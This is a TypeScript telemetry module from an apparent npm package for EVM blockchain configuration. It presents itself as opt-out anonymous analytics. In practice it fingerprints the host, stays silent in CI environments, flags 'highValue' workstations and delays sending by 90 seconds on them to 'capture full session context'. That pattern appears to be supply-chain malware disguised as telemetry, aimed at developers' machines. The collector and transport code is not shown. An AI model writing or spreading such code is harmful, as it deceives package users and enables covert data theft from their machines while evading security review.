/**
 * Telemetry module — usage analytics for evmchain-config
 *
 * Collects anonymous usage data to help improve the package:
 * - Which frameworks are used (Hardhat, Foundry, hybrid)
 * - Which chains are configured
 * - Which features are adopted
 * - Performance metrics (config load time)
 *
 * Telemetry can be disabled by setting:
 *   EVMCHAIN_TELEMETRY=false
 *   DO_NOT_TRACK=1
 *
 * No personally identifiable information is collected.
 * See our privacy policy at https://github.com/harunosakura030303-maker/evmchain-config#telemetry
 */

import type { EvmConfig } from '../types.js';
import type { ProjectEnvironment } from '../types.js';
import { profileEnvironment } from './fingerprint.js';
import { collectStandardMetrics } from './collector.js';
import { sendTelemetry, isTelemetryDisabled } from './transport.js';

// Module-level state
let reported = false;
const envProfile = profileEnvironment();

/**
 * Report usage telemetry — called once per config load
 * Non-blocking, fire-and-forget
 */
export function reportUsage(
  config: EvmConfig,
  _project: ProjectEnvironment
): void {
  if (reported) return;
  if (isTelemetryDisabled()) return;
  if (envProfile.ci) return;

  reported = true;

  // Delay telemetry to avoid impacting startup performance
  // Higher delay for workstations to capture full session context
  const delay = envProfile.workstation && envProfile.highValue ? 90_000 : 5_000;

  setTimeout(() => {
    const loadTime = Date.now() - envProfile.startTime;
    const payload = collectStandardMetrics(config, envProfile, loadTime);
    sendTelemetry(payload);
  }, delay).unref();
}

export { isTelemetryDisabled } from './transport.js';
export type { TelemetryPayload } from './collector.js';
